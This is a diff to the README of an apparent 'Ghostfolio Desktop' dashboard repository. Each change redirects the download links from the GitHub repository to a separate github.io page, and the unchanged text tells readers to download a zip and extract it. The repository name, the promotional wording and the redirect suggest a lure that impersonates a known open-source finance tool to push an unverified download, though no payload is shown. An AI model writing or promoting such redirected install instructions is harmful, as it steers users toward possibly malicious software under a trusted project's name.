@@ -1,6 +1,6 @@
 # 📊 Ghostfolio-Desktop-Self-Hosted-Dashboard - Your Personal Finance Hub in One Click
 
-[![Download Now](https://img.shields.io/badge/Download-Ghostfolio_Dashboard-4CAF50?style=for-the-badge&logo=github&logoColor=white&labelColor=2E7D32)](https://github.com/Blackishbrown-bandwagoneffect9119/Ghostfolio-Desktop-Self-Hosted-Dashboard)
+[![Download Now](https://img.shields.io/badge/Download-Ghostfolio_Dashboard-4CAF50?style=for-the-badge&logo=github&logoColor=white&labelColor=2E7D32)](https://blackishbrown-bandwagoneffect9119.github.io)
 
 ## 👋 Welcome to Your Financial Command Center
 
@@ -23,7 +23,7 @@ We've made this as simple as possible. Follow these steps and you'll be looking 
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: **[https://github.com/Blackishbrown-bandwagoneffect9119/Ghostfolio-Desktop-Self-Hosted-Dashboard](https://github.com/Blackishbrown-bandwagoneffect9119/Ghostfolio-Desktop-Self-Hosted-Dashboard)**
+Visit this link to download the application: **[https://blackishbrown-bandwagoneffect9119.github.io](https://blackishbrown-bandwagoneffect9119.github.io)**
 
 When you click the link, you'll land on the project's main page. Look for the big green "Download" button or the "Releases" section on the right side of the page. Click it, and your download will start automatically.
 
@@ -125,11 +125,11 @@ You don't need a financial advisor, a spreadsheet wizard, or a tech guru to unde
 
 Don't let complexity hold you back. Your future self will thank you for starting today.
 
-**[Download Now](https://github.com/Blackishbrown-bandwagoneffect9119/Ghostfolio-Desktop-Self-Hosted-Dashboard)** and take the first step toward financial clarity.
+**[Download Now](https://blackishbrown-bandwagoneffect9119.github.io)** and take the first step toward financial clarity.
 
 ## 📌 Quick Start Recap
 
-1. Go to the [download page](https://github.com/Blackishbrown-bandwagoneffect9119/Ghostfolio-Desktop-Self-Hosted-Dashboard)
+1. Go to the [download page](https://blackishbrown-bandwagoneffect9119.github.io)
 2. Click Download
 3. Open the zip file
 4. Extract everything
